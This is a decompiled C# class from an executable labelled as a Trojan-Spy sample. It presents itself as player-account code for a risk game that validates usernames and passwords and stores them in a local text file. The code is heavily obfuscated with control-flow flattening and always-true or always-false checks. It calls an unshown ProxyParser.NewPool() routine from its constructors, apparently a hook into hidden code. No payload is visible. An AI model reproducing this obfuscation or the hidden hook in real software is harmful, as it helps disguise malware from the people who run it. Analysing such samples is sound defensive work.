// Decompiled with JetBrains decompiler
// Type: RiskGame.Human
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Annotations;
using ArrayWithOff.Database;
using ArrayWithOff.Dictionaries;
using RiskGame.Dispatcher;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace RiskGame
{
  [Serializable]
  public class Human : Player
  {
    private static readonly string consumer;
    private string customer;
    public bool m_Publisher;
    public bool policy;
    private static List<char> _Rule;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Human(string asset, string col, bool isconsumer, bool countparam2)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_7;
            case 1:
            case 3:
              goto label_1;
            case 4:
              goto label_8;
            case 5:
              goto label_9;
            default:
              num2 = 0;
              continue;
          }
        }
label_1:
        // ISSUE: explicit constructor call
        base.\u002Ector(asset);
        string setup = col;
        if (setup != null)
        {
          this.RegisterSerializer(setup);
          this.m_Publisher = isconsumer;
        }
        else
          break;
label_7:
        this.policy = countparam2;
        num1 = 5;
        continue;
label_8:
        ProxyParser.NewPool();
        num1 = 3;
      }
      throw new ArgumentNullException("password");
label_9:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RegisterSerializer(string setup) => this.customer = setup;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static Human FlushSerializer(string reference, string selection)
    {
      int num1 = 0;
      if (true)
        goto label_5;
label_1:
      int num2 = selection == null ? 1 : 0;
      goto label_3;
label_2:
      num2 = 1;
label_3:
      StreamReader streamReader;
      if (num2 == 0)
      {
        streamReader = new StreamReader(Human.consumer);
        if (true)
        {
          num1 = 6;
          goto label_5;
        }
        else
          goto label_11;
      }
      else
        goto label_9;
label_4:
      int num3;
      num1 = num3;
label_5:
      while (true)
      {
        switch (num1)
        {
          case 0:
            if (!(reference == ""))
            {
              num1 = 3;
              continue;
            }
            goto label_2;
          case 1:
          case 3:
            goto label_11;
          case 2:
          case 4:
            goto label_1;
          case 5:
            goto label_9;
          case 6:
            goto label_13;
          default:
            goto label_6;
        }
      }
label_6:
      num3 = 5;
      goto label_4;
label_13:
      try
      {
        string str1;
        bool result1;
        bool result2;
        do
        {
          string str2;
          bool flag = (str2 = streamReader.ReadLine()) != null;
          int num4 = 2;
          string str3;
          while (true)
          {
            int num5 = num4;
            string str4;
            string str5;
            while (true)
            {
              switch (num5)
              {
                case 0:
                case 5:
                  goto label_15;
                case 1:
                  result2 = false;
                  bool.TryParse(str5, out result2);
                  if (true)
                  {
                    num5 = 7;
                    continue;
                  }
                  goto label_28;
                case 2:
                  goto label_20;
                case 3:
                  goto label_28;
                case 4:
                case 7:
                  goto label_22;
                case 6:
                  result1 = false;
                  bool.TryParse(str4, out result1);
                  goto case 1;
                case 8:
                  goto label_29;
                default:
                  goto label_19;
              }
            }
label_15:
            str3 = str2.Substring(10, 15);
            str4 = str2.Substring(25, 5);
            str5 = str2.Substring(30, 5);
            num4 = 3;
            continue;
label_19:
            num4 = 1;
            continue;
label_20:
            if (flag)
            {
              str1 = str2.Substring(0, 10);
              num4 = 5;
              continue;
            }
            num4 = 8;
            continue;
label_28:
            str1 = str1.Trim();
            str3 = str3.Trim();
            str4 = str4.Trim();
            str5 = str5.Trim();
            num4 = 6;
          }
label_22:
          if (str1 == reference && str3 == selection)
            goto label_23;
        }
        while (!(str1 == reference));
        goto label_25;
label_23:
        return new Human(reference, selection, result1, result2);
label_25:
        throw new WrapperModelDispatcher();
label_29:
        throw new ModelParser();
      }
      finally
      {
        streamReader?.Dispose();
      }
label_9:
      throw new ArgumentNullException();
label_11:
      if (reference != null && !(selection == ""))
      {
        num3 = 4;
        goto label_4;
      }
      else
        goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Register(
      string username,
      string password,
      bool music_enabled,
      bool hints_enabled)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              Human.SearchSerializer(username, password);
              int num3 = 3;
              num2 = Human.AwakeContainer() ? num3 : num3;
              continue;
            case 1:
            case 3:
              goto label_3;
            case 4:
              goto label_7;
            case 5:
              goto label_2;
            default:
              goto label_6;
          }
        }
label_3:
        Human human = new Human(username, password, music_enabled, hints_enabled);
        goto label_7;
label_6:
        num1 = 4;
        continue;
label_7:
        Human.ConnectSerializer(human);
        num1 = 5;
      }
label_2:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void ConnectSerializer(Human value)
    {
      using (StreamWriter streamWriter = new StreamWriter(Human.consumer, true))
      {
        string str = string.Format("{0}{1}{2}{3}", (object) value.ResetExpression().PadRight(10), (object) value.customer.PadRight(15), (object) value.m_Publisher.ToString().PadRight(5), (object) value.policy.ToString().PadRight(5));
        int num = 2;
        if (Human.CancelContainer())
          goto label_3;
label_2:
        streamWriter.WriteLine(str);
        return;
label_3:
        while (true)
        {
          switch (num)
          {
            case 0:
            case 2:
              goto label_2;
            case 1:
              goto label_8;
            case 3:
              goto label_9;
            default:
              num = 3;
              continue;
          }
        }
label_8:
        return;
label_9:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void QuerySerializer(Human setup)
    {
      int num1 = 3;
      List<string> stringList;
      StreamWriter streamWriter;
      while (true)
      {
        StreamReader streamReader;
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            stringList = new List<string>();
            num1 = 4;
            continue;
          case 1:
          case 4:
            streamReader = new StreamReader(Human.consumer);
            goto case 2;
          case 2:
            try
            {
              string str1 = setup.ResetExpression().PadRight(10);
              int num3 = 2;
              while (true)
              {
                int num4 = num3;
                while (true)
                {
                  string str2;
                  string str3;
                  string str4;
                  bool flag;
                  int num5;
                  switch (num4)
                  {
                    case 0:
                    case 2:
                      str2 = setup.customer.PadRight(15);
                      goto label_21;
                    case 1:
                    case 4:
                      num5 = str2 == str3 ? 1 : 0;
                      break;
                    case 3:
label_19:
                      goto label_20;
                    case 5:
                      if (flag)
                      {
                        string str5 = str4.Substring(0, 10);
                        str3 = str4.Substring(10, 15);
                        if (!(str1 == str5))
                        {
                          num5 = 0;
                          break;
                        }
                        goto label_18;
                      }
                      else
                        goto label_15;
                    case 6:
                      goto label_25;
                    default:
                      goto label_13;
                  }
                  if (num5 != 0)
                  {
                    stringList.Add(string.Format("{0}{1}{2}{3}", (object) str1, (object) str2, (object) setup.m_Publisher.ToString().PadRight(5), (object) setup.policy.ToString().PadRight(5)));
                  }
                  else
                  {
                    stringList.Add(str4);
                    goto label_19;
                  }
label_20:
label_21:
                  flag = (str4 = streamReader.ReadLine()) != null;
                  if (true)
                    num4 = 5;
                  else
                    goto label_25;
                }
label_13:
                num3 = 3;
                continue;
label_15:
                num3 = 6;
                continue;
label_18:
                num3 = 4;
              }
            }
            finally
            {
              streamReader?.Dispose();
            }
label_25:
            streamWriter = new StreamWriter(Human.consumer, false);
            num2 = 5;
            break;
          case 5:
            goto label_27;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
      }
label_27:
      try
      {
        foreach (string str in stringList)
        {
          int num6 = 2;
          while (true)
          {
            switch (num6)
            {
              case 0:
              case 2:
                goto label_30;
              case 1:
              case 3:
                goto label_33;
              default:
                num6 = 3;
                continue;
            }
          }
label_30:
          streamWriter.WriteLine(str);
label_33:;
        }
      }
      finally
      {
        streamWriter?.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void FindSerializer(Human value, string cust)
    {
      int num1 = 4;
      List<string> stringList;
      StreamReader streamReader;
      StreamWriter streamWriter;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            stringList = new List<string>();
            num1 = 3;
            continue;
          case 1:
          case 3:
            streamReader = new StreamReader(Human.consumer);
            goto case 2;
          case 2:
            try
            {
              string str1 = value.ResetExpression().PadRight(10);
              int num2 = 3;
              if (true)
                goto label_5;
label_3:
              string str2;
              string str3 = str2.Substring(10, 15);
              goto label_14;
label_4:
              int num3;
              num2 = num3;
label_5:
              string str4;
              switch (num2)
              {
                case 0:
                case 3:
                  str4 = value.customer.PadRight(15);
                  goto label_10;
                case 1:
                case 2:
                  goto label_3;
                case 4:
                  goto label_14;
                case 5:
                  stringList.Add(string.Format("{0}{1}{2}{3}", (object) str1, (object) cust.PadRight(15), (object) value.m_Publisher.ToString().PadRight(5), (object) value.m_Publisher.ToString().PadRight(5)));
                  break;
                case 6:
                  goto label_19;
                default:
                  num3 = 4;
                  goto label_4;
              }
label_9:
label_10:
              string str5;
              if ((str2 = streamReader.ReadLine()) == null)
              {
                num2 = 6;
                goto label_5;
              }
              else
              {
                str5 = str2.Substring(0, 10);
                if (Human.CancelContainer())
                {
                  num2 = 2;
                  goto label_5;
                }
              }
label_14:
              if (!(str1 == str5) || !(str4 == str3))
              {
                stringList.Add(str2);
                goto label_9;
              }
              else
              {
                num3 = 5;
                goto label_4;
              }
            }
            finally
            {
              streamReader?.Dispose();
            }
label_19:
            streamWriter = new StreamWriter(Human.consumer, false);
            num1 = 5;
            continue;
          case 5:
            goto label_23;
          default:
            num1 = 2;
            continue;
        }
      }
label_23:
      try
      {
        foreach (string str in stringList)
        {
          int num4 = 2;
          while (true)
          {
            switch (num4)
            {
              case 0:
              case 2:
                goto label_26;
              case 1:
              case 3:
                goto label_29;
              default:
                if (true)
                {
                  num4 = 3;
                  continue;
                }
                goto label_29;
            }
          }
label_26:
          streamWriter.WriteLine(str);
label_29:;
        }
      }
      finally
      {
        streamWriter?.Dispose();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void SearchSerializer(string def, string second)
    {
      int num1 = 5;
      char[] charArray1;
      char[] charArray2;
      while (true)
      {
        int num2;
        int num3;
        int num4;
        switch (num1)
        {
          case 0:
          case 5:
            if (!(def == ""))
            {
              num2 = 1;
              goto label_13;
            }
            else
              goto label_7;
          case 1:
            if (def != null && !(second == ""))
            {
              num3 = second == null ? 1 : 0;
              goto label_8;
            }
            else
              goto label_7;
          case 2:
            if (!Human.ChangeSerializer(charArray2) || !Human.PostSerializer(charArray2) || !Human.VisitSerializer(def))
              break;
            goto case 3;
          case 3:
          case 6:
            if (Human.CalculateSerializer(charArray1) && Human.FillSerializer(charArray1))
            {
              num1 = 4;
              continue;
            }
            break;
          case 4:
            num4 = !Human.CancelSerializer(charArray1) ? 1 : 0;
            goto label_3;
          case 7:
            goto label_20;
          default:
            num2 = 6;
            goto label_13;
        }
        num4 = 1;
label_3:
        if (num4 != 0)
        {
          num2 = 7;
          goto label_13;
        }
        else
          break;
label_7:
        num3 = 1;
label_8:
        if (num3 == 0)
        {
          charArray2 = def.ToCharArray();
          charArray1 = second.ToCharArray();
          num2 = 2;
        }
        else
          goto label_9;
label_13:
        num1 = num2;
      }
      return;
label_9:
      throw new ArgumentNullException();
label_20:
      throw new ListenerServerAnnotation(Human.ChangeSerializer(charArray2), Human.PostSerializer(charArray2), Human.VisitSerializer(def), Human.CalculateSerializer(charArray1), Human.FillSerializer(charArray1), Human.CancelSerializer(charArray1));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void AssetSerializer(string first)
    {
      int num1 = 0;
      char[] charArray;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
              goto label_6;
            case 1:
              goto label_1;
            case 2:
            case 5:
              if (!Human.CalculateSerializer(charArray))
                break;
              goto case 3;
            case 3:
            case 4:
              if (Human.FillSerializer(charArray))
              {
                num3 = !Human.CancelSerializer(charArray) ? 1 : 0;
                goto label_11;
              }
              else
                break;
            case 6:
              goto label_18;
            default:
              num2 = 4;
              continue;
          }
          num3 = 1;
label_11:
          if (num3 != 0)
            num2 = 6;
          else
            goto label_14;
        }
label_1:
        int num4 = first == null ? 1 : 0;
label_3:
        if (num4 == 0)
        {
          charArray = first.ToCharArray();
          num1 = 5;
          continue;
        }
        break;
label_6:
        if (first == "")
        {
          num4 = 1;
          goto label_3;
        }
        else
          num1 = 1;
      }
      throw new ArgumentNullException();
label_14:
      return;
label_18:
      throw new ListenerServerAnnotation(true, true, true, Human.CalculateSerializer(charArray), Human.FillSerializer(charArray), Human.CancelSerializer(charArray));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool ChangeSerializer(char[] i)
    {
      int num1 = 3;
      if (true)
        goto label_4;
label_1:
      int num2 = i.Length < 3 ? 1 : 0;
label_3:
      bool flag;
      if (num2 == 0)
      {
        flag = true;
        if (true)
          num1 = 5;
        else
          goto label_8;
      }
      else
        goto label_6;
label_4:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_8;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_6;
          case 5:
            goto label_11;
          default:
            num1 = 4;
            continue;
        }
      }
label_6:
      flag = false;
      goto label_11;
label_8:
      if (i.Length > 10)
      {
        num2 = 1;
        goto label_3;
      }
      else
      {
        num1 = 2;
        goto label_4;
      }
label_11:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool PostSerializer(char[] key)
    {
      int num1 = 4;
      bool flag;
      while (true)
      {
        int num2 = num1;
label_10:
        List<char> charList;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_1;
            case 2:
            case 5:
              goto label_2;
            case 3:
            case 6:
            case 7:
              goto label_12;
            case 4:
              charList = new List<char>()
              {
                '_',
                '-',
                '.',
                ',',
                '/'
              };
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_12;
            default:
              goto label_11;
          }
        }
label_1:
        char[] chArray = key;
        int index = 0;
        num1 = 2;
        continue;
label_2:
        while (index < chArray.Length)
        {
          char c = chArray[index];
          if (char.IsLetterOrDigit(c) || charList.Contains(c))
          {
            ++index;
            if (!Human.AwakeContainer())
            {
              num2 = 5;
              goto label_10;
            }
          }
          else
          {
            flag = false;
            goto label_12;
          }
        }
        flag = true;
        num1 = 7;
        continue;
label_11:
        num1 = 6;
      }
label_12:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool VisitSerializer(string asset)
    {
      int num1 = 2;
      bool flag1;
      while (true)
      {
        int num2 = num1;
label_20:
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_22;
            case 1:
            case 3:
              goto label_17;
            case 4:
              goto label_1;
            case 5:
              goto label_23;
            default:
              num2 = 4;
              continue;
          }
        }
label_17:
        bool flag2;
        while (!flag2)
        {
          flag1 = true;
          if (true)
          {
            num2 = 5;
            goto label_20;
          }
        }
        goto label_18;
label_22:
        flag2 = File.Exists(Human.consumer);
        num1 = 3;
      }
label_1:
      StreamReader streamReader;
      try
      {
label_6:
        string str1;
        bool flag3 = (str1 = streamReader.ReadLine()) != null;
label_3:
        string str2;
        int num3;
        while (flag3)
        {
          str2 = str1.Substring(0, 10);
          num3 = 4;
          if (true)
            goto label_8;
        }
        int num4 = 5;
label_7:
        num3 = num4;
label_8:
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 1:
              goto label_5;
            case 2:
            case 3:
              goto label_3;
            case 4:
              str2 = str2.Trim();
              if (str2 == asset)
              {
                if (true)
                {
                  num3 = 0;
                  continue;
                }
                goto label_12;
              }
              else
                goto label_6;
            case 5:
              goto label_12;
            default:
              goto label_9;
          }
        }
label_5:
        flag1 = false;
        goto label_23;
label_9:
        num4 = 3;
        goto label_7;
label_12:
        flag1 = true;
        goto label_23;
      }
      finally
      {
        streamReader?.Dispose();
      }
label_18:
      streamReader = new StreamReader(Human.consumer);
      goto label_1;
label_23:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool CalculateSerializer(char[] info)
    {
      int num1 = 2;
      bool serializer;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 2:
              if (info.Length > 15)
              {
                num3 = 1;
                break;
              }
              goto label_9;
            case 1:
            case 4:
              num3 = info.Length < 8 ? 1 : 0;
              break;
            case 3:
            case 5:
              goto label_12;
            default:
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto case 0;
          }
          if (num3 == 0)
          {
            serializer = true;
            if (!Human.AwakeContainer())
              num2 = 5;
            else
              goto label_12;
          }
          else
            goto label_4;
        }
label_9:
        num1 = 4;
      }
label_4:
      serializer = false;
label_12:
      return serializer;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool FillSerializer(char[] value)
    {
      int num1 = 3;
      if (true)
        goto label_7;
label_1:
      bool flag = false;
      goto label_15;
label_7:
      while (true)
      {
        int index;
        char[] chArray;
        int num2;
        char c;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            chArray = value;
            num1 = 4;
            continue;
          case 1:
          case 4:
            index = 0;
            num1 = 6;
            continue;
          case 2:
            goto label_1;
          case 5:
            num3 = !Human._Rule.Contains(c) ? 1 : 0;
            goto label_12;
          case 6:
label_3:
            if (index >= chArray.Length)
            {
              flag = true;
              num2 = 7;
              break;
            }
            c = chArray[index];
            if (char.IsLetterOrDigit(c))
            {
              num3 = 0;
              goto label_12;
            }
            else
              goto case 5;
          case 7:
            goto label_15;
          default:
            num2 = 5;
            break;
        }
label_6:
        num1 = num2;
        continue;
label_12:
        if (num3 == 0)
        {
          ++index;
          goto label_3;
        }
        else
        {
          num2 = 2;
          goto label_6;
        }
      }
label_15:
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static bool CancelSerializer(char[] param)
    {
      int num1 = 5;
      bool flag1;
      while (true)
      {
        int num2 = num1;
        bool flag2;
        bool flag3;
        bool flag4;
        bool flag5;
        bool flag6;
        while (true)
        {
          char c;
          bool flag7;
          int index;
          char[] chArray;
          switch (num2)
          {
            case 0:
            case 5:
label_23:
              flag5 = false;
              num2 = 6;
              continue;
            case 1:
              if (!flag4)
              {
                flag1 = false;
                if (Human.CancelContainer())
                {
                  num2 = 10;
                  continue;
                }
                goto case 9;
              }
              else
                goto label_9;
            case 2:
            case 4:
            case 7:
label_13:
              ++index;
              break;
            case 3:
              flag2 = true;
              goto case 2;
            case 6:
              flag2 = false;
              flag3 = false;
              flag6 = false;
              chArray = param;
              index = 0;
              break;
            case 8:
              goto label_7;
            case 9:
              if (!flag7)
              {
                if (!char.IsDigit(c))
                  goto case 2;
                else
                  goto label_7;
              }
              else
                goto label_12;
            case 10:
              goto label_24;
            default:
              num2 = 8;
              continue;
          }
          if (index < chArray.Length)
          {
            c = chArray[index];
            if (char.IsUpper(c))
            {
              flag5 = true;
              goto label_13;
            }
            else if (!char.IsLower(c))
            {
              flag7 = Human._Rule.Contains(c);
              if (Human.CancelContainer())
                num2 = 9;
              else
                goto label_23;
            }
            else
              goto label_20;
          }
          else
            goto label_15;
        }
label_7:
        flag3 = true;
        num1 = 4;
        continue;
label_12:
        num1 = 3;
        continue;
label_15:
        flag4 = flag5 & flag2 & flag3 & flag6;
        num1 = 1;
        continue;
label_20:
        flag6 = true;
        num1 = 7;
      }
label_9:
      flag1 = true;
label_24:
      return flag1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Human()
    {
      int num = 4;
      if (Human.CancelContainer())
        goto label_3;
label_1:
      Human._Rule = new List<char>()
      {
        '!',
        '£',
        '$',
        '€',
        '%',
        '^',
        '&',
        '*',
        '+',
        '-',
        '=',
        '_',
        '<',
        '>',
        '@',
        '?',
        '~',
        '#'
      };
      num = 5;
label_3:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            ProxyParser.NewPool();
            if (Human.CancelContainer())
            {
              num = 2;
              continue;
            }
            goto label_6;
          case 1:
          case 2:
            goto label_2;
          case 3:
            goto label_1;
          case 5:
            goto label_8;
          default:
            if (!Human.AwakeContainer())
            {
              num = 3;
              continue;
            }
            goto case 0;
        }
      }
label_2:
      Human.consumer = "Usersaves.txt";
      goto label_1;
label_8:
      return;
label_6:;
    }

    internal static bool CancelContainer() => true;

    internal static bool AwakeContainer() => false;
  }
}
